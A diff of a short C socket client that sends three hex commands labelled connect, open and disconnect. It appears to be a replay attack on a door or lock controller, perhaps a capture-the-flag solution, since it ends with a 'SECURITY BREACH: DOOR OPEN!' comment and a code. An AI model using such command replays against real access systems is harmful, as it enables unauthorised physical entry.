@@ -6,7 +6,6 @@
 
 #define BUFFER_SIZE 1024
 
-// Convert hex string to byte array
 int hex_to_bytes(const char *hex, unsigned char *bytes) {
     int len = strlen(hex);
     if (len % 2 != 0) return -1;
@@ -68,11 +67,10 @@ int main(int argc, char *argv[]) {
         return 1;
     }
 
-    // Replace these with the actual hex payloads
-    send_hex_command(sock, "aa9666c4e715384b70a6b4a9f87c5a515cc6f0b56b3ed51a5606501405520f99"); // connect
-    send_hex_command(sock, "6b5c7fa3a7f0495b9941d7f393a8dd0f5d409df6fe9fad11d72427460849a428"); // open
-    send_hex_command(sock, "65334e87db76888845fd9e80ce345f467f9877c384d2dd216c082f6fd7710888"); // disconnect
+    send_hex_command(sock, "3996123f13a9c1a37321016566b85cb3"); // connect
+    send_hex_command(sock, "e19b15d6cdb17ecaaacab66501cbdb26"); // open
+    send_hex_command(sock, "393c7eb9b0ba57eb5c385304f9722f62"); // disconnect
 
     close(sock);
     return 0;
-} //1313B098
+} // SECURITY BREACH: DOOR OPEN!  code: 1313B098
